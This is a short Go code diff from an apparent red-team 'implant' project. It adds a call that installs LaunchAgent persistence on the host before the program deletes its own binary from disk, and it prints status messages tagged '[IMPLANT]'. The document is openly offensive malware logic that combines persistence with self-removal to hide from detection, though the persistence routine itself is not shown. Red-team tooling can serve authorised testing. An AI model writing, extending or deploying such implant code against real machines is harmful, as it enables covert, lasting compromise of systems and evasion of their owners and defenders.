@@ -9,6 +9,7 @@ import (
 	"redteam-portfolio/pkg/comms"
 	"redteam-portfolio/pkg/crypto"
 	"redteam-portfolio/pkg/evasion"
+	"redteam-portfolio/pkg/persistence"
 	"runtime"
 	"time"
 )
@@ -31,6 +32,14 @@ func main() {
 		return
 	}
 
+	// Install LaunchAgent persistence BEFORE deleting the original binary
+	if err := persistence.Install(); err != nil {
+		fmt.Printf("[IMPLANT] Persistence skipped: %v\n", err)
+	} else {
+		fmt.Println("[IMPLANT] Persistence installed")
+	}
+
+	// Remove original binary from disk
 	if len(os.Args) > 0 {
 		os.Remove(os.Args[0])
 		fmt.Println("[IMPLANT] Removed from disk")
